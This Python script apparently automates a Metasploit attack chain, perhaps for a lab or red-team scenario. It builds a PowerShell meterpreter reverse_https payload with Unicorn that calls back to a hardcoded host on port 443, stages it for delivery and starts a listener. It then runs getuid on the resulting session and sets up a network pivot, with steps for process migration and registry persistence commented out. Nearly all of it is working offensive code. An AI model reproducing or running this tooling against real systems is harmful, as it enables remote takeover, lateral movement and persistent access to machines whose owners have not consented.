from time import sleep
import library.msf_session_list as session_list
from library.pymetasploit3.msfrpc import MsfRpcClient
import stage2.payloadDelivery.multi.httpshandler as httpshandler
import stage3.getuid as getuid
# import stage3.internalC2.windows.migrate64 as migrate64
# import stage3.persistence.registry.persistence as persistence
import stage3.internalC2.multi.pivot as pivot
import subprocess

# Declare variables
HOST_IP='192.168.1.8'
MSGRPC_IP='172.19.0.4'

client = MsfRpcClient("123",server=MSGRPC_IP,port=55552)

def main():
    #Stage 2
    #Create payload
    print("[-] Creating unicorn payload...")
    subprocess.call("cd /opt/unicorn && python unicorn.py windows/meterpreter/reverse_https %s 443" %HOST_IP,shell=True)
    subprocess.call("tail -1 /opt/unicorn/powershell_attack.txt > /opt/filetransfer/pl.txt",shell=True)
    #Start handler
    httpshandler.init(client) 
    sid = session_list.init(client, lhost='%s:443' %MSGRPC_IP)
    #Getuid command
    getuid.init(client,sid)
    #Create pivot by configuring routing
    pivot.init(client,sid)
    print("Finished!")
    #Migrate to explorer.exe
    #migrate64.init(client,sid)
    #Establish persistence
    #persistence.init(client,sid)

print("[*][*] THIS PROGRAM IS AN AUTOMATION BASED ON THE SCENARIO SHOWN [*][*]")
sleep(3)
main()